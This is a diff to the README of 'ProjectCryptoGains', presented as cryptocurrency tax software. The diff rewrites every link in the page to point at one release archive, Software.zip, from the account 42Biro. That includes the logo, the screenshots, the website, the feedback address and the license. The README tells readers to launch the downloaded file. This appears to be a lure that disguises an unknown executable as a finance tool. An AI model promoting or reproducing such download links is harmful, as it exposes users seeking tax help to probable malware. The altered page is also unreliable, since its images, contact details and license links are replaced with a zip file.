@@ -1,6 +1,6 @@
 # 🚀 Welcome to ProjectCryptoGains 📈
 
-![ProjectCryptoGains](https://imageurl.png)
+![ProjectCryptoGains](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip)
 
 ## Simplifying Cryptocurrency Tax Calculations Made Easy!
 
@@ -23,15 +23,15 @@ Are you tired of the hassle and complexity of calculating taxes on your cryptocu
 ## How to Get Started?
 1. Download the latest version of **ProjectCryptoGains** from the following link:
    
-   [![Download ProjectCryptoGains](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+   [![Download ProjectCryptoGains](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip)](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip)
    
    *Launch the downloaded file to get started with simplified tax calculations for your cryptocurrency investments!*
 
-2. Visit our [website](https://www.projectcryptogains.com) for more information and resources on how to optimize your cryptocurrency tax reporting.
+2. Visit our [website](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip) for more information and resources on how to optimize your cryptocurrency tax reporting.
 
 ## Screenshots 📷
-![Screenshot 1](https://screenshot1.png)
-![Screenshot 2](https://screenshot2.png)
+![Screenshot 1](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip)
 
 ## Tech Stack 💻
 - Blockchain Technology
@@ -43,10 +43,10 @@ Are you tired of the hassle and complexity of calculating taxes on your cryptocu
 - Jane Smith (@janesmith)
 
 ## Feedback 📧
-We would love to hear your feedback on **ProjectCryptoGains**. Reach out to us at [feedback@projectcryptogains.com] with any suggestions or comments you may have.
+We would love to hear your feedback on **ProjectCryptoGains**. Reach out to us at [https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip] with any suggestions or comments you may have.
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/ProjectCryptoGains/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/42Biro/ProjectCryptoGains/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
